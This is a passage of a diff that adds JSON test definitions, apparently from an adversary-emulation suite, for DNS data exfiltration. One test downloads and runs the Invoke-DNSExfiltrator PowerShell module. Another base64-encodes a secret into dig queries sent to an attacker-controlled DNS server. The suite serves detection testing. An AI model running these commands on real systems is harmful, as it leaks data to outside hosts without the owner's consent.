+                            },
+                            "time": {
+                                "description": "The time in milliseconds to wait between each DNS request",
+                                "type": "string",
+                                "default": "500"
+                            },
+                            "encoding": {
+                                "description": "Set to '-b32' to use base32 encoding of data. Might be required by some DNS resolvers.",
+                                "type": "string",
+                                "default": null
+                            }
+                        },
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "DNSExfiltrator powershell file must exist on disk at specified location (#{ps_module})\n",
+                                "prereq_command": "if (Test-Path \"#{ps_module}\") {exit 0} else {exit 1}\n",
+                                "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nIWR \"https://raw.githubusercontent.com/Arno0x/DNSExfiltrator/8faa972408b0384416fffd5b4d42a7aa00526ca8/Invoke-DNSExfiltrator.ps1\" -OutFile \"#{ps_module}\"\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "Import-Module \"#{ps_module}\"\nInvoke-DNSExfiltrator -i \"#{ps_module}\" -d #{domain} -p #{password} -doh #{doh} -t #{time} #{encoding}\n",
+                            "name": "powershell"
+                        }
+                    },
+                    {
+                        "name": "Exfiltrate Data using DNS Queries via dig",
+                        "auto_generated_guid": "a27916da-05f2-4316-a3ee-feec67a437be",
+                        "description": "This test demonstrates how an attacker can exfiltrate sensitive information by encoding it as a subdomain (using base64 encoding) and \nmaking DNS queries via the dig command to a controlled DNS server.\n",
+                        "supported_platforms": [
+                            "macos",
+                            "linux"
+                        ],
+                        "input_arguments": {
+                            "dns_port": {
+                                "type": "integer",
+                                "default": "53",
+                                "description": "Attacker's DNS server port"
+                            },
+                            "attacker_dns_server": {
+                                "type": "string",
+                                "default": "8.8.8.8",
+                                "description": "Attacker's DNS server address"
+                            },
+                            "secret_info": {
+                                "type": "string",
+                                "default": "this is a secret info",
+                                "description": "secret info that will be exfiltirated"
+                            }
+                        },
+                        "dependency_executor_name": "bash",
+                        "dependencies": [
+                            {
+                                "description": "dig command",
+                                "prereq_command": "which dig",
+                                "get_prereq_command": "which apt && sudo apt update && sudo apt install -y bind9-dnsutils || which yum && sudo yum install -y bind-utils || which dnf && sudo dnf install -y bind-utils || which apk && sudo apk add bind-tools || which pkg && sudo pkg update && sudo pkg install -y bind-tools || which brew && brew update && brew install --quiet bind\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "dig @#{attacker_dns_server} -p #{dns_port} $(echo \"#{secret_info}\" | base64).google.com\n",
+                            "name": "bash",
+                            "elevation_required": false
+                        }
+                    }
+                ]
+            }
+        ]
+    },
+    "timestamp": "2025-02-28 11:32:17"
+}
